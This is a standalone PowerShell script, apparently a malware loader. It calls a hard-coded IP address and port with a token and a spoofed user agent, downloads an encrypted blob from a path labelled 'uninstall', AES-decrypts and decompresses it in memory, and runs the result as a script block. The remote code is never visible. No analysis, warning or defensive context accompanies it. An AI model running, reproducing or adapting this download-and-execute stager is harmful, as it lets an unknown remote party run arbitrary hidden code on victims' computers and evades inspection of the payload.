$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$B = 'http://51.75.118.5:20216'
$T = 'tk-48232543-a9d6F'
$U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'

$sha = [Security.Cryptography.SHA256]::Create()
$key = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))

try {
  $r = Invoke-RestMethod -Uri "$B/s/$T/uninstall" -UseBasicParsing -UserAgent $U -TimeoutSec 30
} catch {
  Write-Host "download failed: $($_.Exception.Message)" -ForegroundColor Red
  return
}
if (-not $r.d) { Write-Host 'empty payload' -ForegroundColor Red; return }

$aes = [Security.Cryptography.Aes]::Create()
$aes.Mode = 'CBC'
$aes.Padding = 'PKCS7'
$aes.Key = [Convert]::FromBase64String($r.k)
$aes.IV = [Convert]::FromBase64String($r.v)
$dec = $aes.CreateDecryptor()
$enc = [Convert]::FromBase64String($r.d)
$gz = $dec.TransformFinalBlock($enc, 0, $enc.Length)

$ms = New-Object IO.MemoryStream(,$gz)
$zs = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($zs)
$src = $sr.ReadToEnd()
$sr.Close(); $zs.Close(); $ms.Close()

if (-not $src) { Write-Host 'empty source' -ForegroundColor Red; return }
$sb = [ScriptBlock]::Create($src)
& $sb
